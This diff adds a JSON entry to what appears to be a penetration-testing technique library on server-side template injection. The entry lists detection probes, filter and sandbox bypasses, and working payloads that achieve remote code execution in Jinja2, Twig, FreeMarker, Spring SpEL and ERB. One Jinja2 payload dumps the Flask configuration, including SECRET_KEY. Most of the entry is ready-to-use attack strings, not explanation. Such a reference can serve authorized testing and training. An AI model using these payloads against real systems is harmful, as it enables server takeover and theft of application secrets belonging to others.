@@ -1,0 +1,66 @@
+{
+  "id": "injection-ssti-detection",
+  "title": "Server-Side Template Injection (SSTI) Detection & Exploitation",
+  "category": "injection",
+  "tags": ["ssti", "template-injection", "rce", "jinja2", "twig", "freemarker"],
+  "applicability": {
+    "technologies": ["python-flask", "python-django", "java-spring", "php", "ruby-rails", "node"],
+    "contexts": ["form-input", "url-parameter", "api-endpoint", "email-template"],
+    "preconditions": ["user-input-in-template", "server-side-rendering"]
+  },
+  "technique": {
+    "summary": "Detect and exploit SSTI by injecting template syntax into user-controlled input. Different template engines have different syntax, so polyglot payloads help identify the engine. SSTI frequently leads to RCE.",
+    "steps": [
+      "Inject mathematical expression probes: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>",
+      "If 49 appears in the response, SSTI is confirmed — identify the engine",
+      "Jinja2 (Python): {{config}} or {{self.__init__.__globals__}}",
+      "Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+      "FreeMarker (Java): ${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+      "ERB (Ruby): <%= system('id') %>",
+      "Escalate from information disclosure to RCE via engine-specific gadget chains"
+    ],
+    "payloads": [
+      {
+        "payload": "{{7*'7'}}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Returns 7777777 in Jinja2, 49 in Twig — helps fingerprint engine"
+      },
+      {
+        "payload": "{{config.items()}}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Jinja2 — dumps Flask config including SECRET_KEY"
+      },
+      {
+        "payload": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Jinja2 RCE via Python builtins"
+      },
+      {
+        "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "Spring Expression Language (SpEL) injection"
+      },
+      {
+        "payload": "<%= `id` %>",
+        "encoding": "raw",
+        "context": "form-input",
+        "notes": "ERB (Ruby) command execution via backticks"
+      }
+    ],
+    "bypassTechniques": [
+      "URL-encode template delimiters: %7B%7B7*7%7D%7D",
+      "Use alternative Jinja2 syntax: {% print 7*7 %}",
+      "Bypass sandboxes via MRO chain: ''.__class__.__mro__[1].__subclasses__()",
+      "Use attr() filter in Jinja2 to bypass dot-notation restrictions"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/web-security/server-side-template-injection",
+    "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+  ],
+  "source": "portswigger-research"
+}
